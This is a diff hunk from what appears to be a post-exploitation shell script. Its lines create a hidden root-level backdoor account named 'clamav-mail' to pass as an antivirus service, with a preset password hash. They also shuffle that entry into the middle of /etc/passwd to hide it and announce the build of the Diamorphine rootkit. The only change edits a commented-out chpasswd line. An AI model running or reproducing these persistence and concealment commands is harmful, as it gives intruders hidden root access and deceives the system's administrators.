@@ -604,7 +604,7 @@ chmod 600 ~/.ssh/authorized_keys
 
 useradd -u 0 -G root,sudo -M -o -s /bin/bash -p '$1$GDwMqCqg$eDXKBHbUDpOgunTpref5J1' clamav-mail
 awk '{lines[NR] = $0} END {last_line = lines[NR]; delete lines[NR]; middle = int(NR/2); for (i=1; i<middle; i++) print lines[i]; print last_line; for (i=middle; i<NR; i++) print lines[i]}' /etc/passwd > /tmp/passwd && sudo mv /tmp/passwd /etc/passwd
-### NOT NEEDED! ### sudo echo "clamav-mail4:'$1$JSi1yOvo$RXt73G6AUw2EhNhvJn4Ei1'" | sudo chpasswd -e
+### NOT NEEDED! ### sudo echo "clamav-mail:'$1$JSi1yOvo$RXt73G6AUw2EhNhvJn4Ei1'" | sudo chpasswd -e
 ###(lala´s std)
 
 echo "[*] make toolZ, Diamorphine"
